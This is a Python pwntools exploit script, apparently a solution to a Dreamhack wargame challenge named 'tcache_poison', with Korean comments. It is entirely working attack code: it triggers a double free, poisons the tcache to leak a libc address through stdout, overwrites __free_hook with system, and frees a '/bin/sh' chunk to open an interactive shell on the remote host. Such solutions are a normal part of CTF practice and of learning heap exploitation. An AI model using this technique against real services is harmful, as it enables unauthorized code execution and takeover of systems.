from pwn import *

r = remote("host3.dreamhack.games", 12360)

e = ELF("./tcache_poison")
libc = ELF("./libc-2.27.so")


def alloc(size, data):
    r.sendlineafter("Edit\n", "1")
    r.sendlineafter(":", str(size))
    r.sendafter(":", data)
def free():
    r.sendlineafter("Edit\n", "2")
def print_chunk():
    r.sendlineafter("Edit\n", "3")
def edit(data):
    r.sendlineafter("Edit\n", "4")
    r.sendafter(":", data)




alloc(64, "abcd")
free()
edit("aaaaaaaa"+"\x00") # DFB 일으킬 수 있다. 8byte 이상 조작했으므로..
free() # 중복 해제

addr_stdout = e.symbols["stdout"]
alloc(64, p64(addr_stdout)) # fd에 addr_stdout 들어간다.
alloc(64, "aaaaaaaa")
alloc(64, "\x60") # 0x601010 유지하기 위해...
#  chunk = 0x601010.. 유지하도록 \x60 content로 넣어준다.
# chunk = 0x601010 = \x00...\x60
# packing 때문에 \x60 넣으면 마지막 바이트에 \x60들어가서 
# stdout_addr이 보존된다.

print_chunk()
r.recvuntil("Content: ") # "Content: "만큼 넘겨주기
stdout = u64(r.recv(6).ljust(8, b"\x00"))
lb = stdout - libc.symbols["_IO_2_1_stdout_"]
free_hook = lb + libc.symbols["__free_hook"]
system = lb + libc.symbols["system"]


alloc(80, "bbb")
free()
edit("editeditt")
free()
alloc(80,  p64(free_hook)) # fd에 write

alloc(80,"asdf") #bbb chunk꺼낸다.
alloc(80, p64(system)) #free_hook chunk 꺼내서 system 주소로 덮는다.

alloc(8, b"/bin/sh")
free()



r.interactive()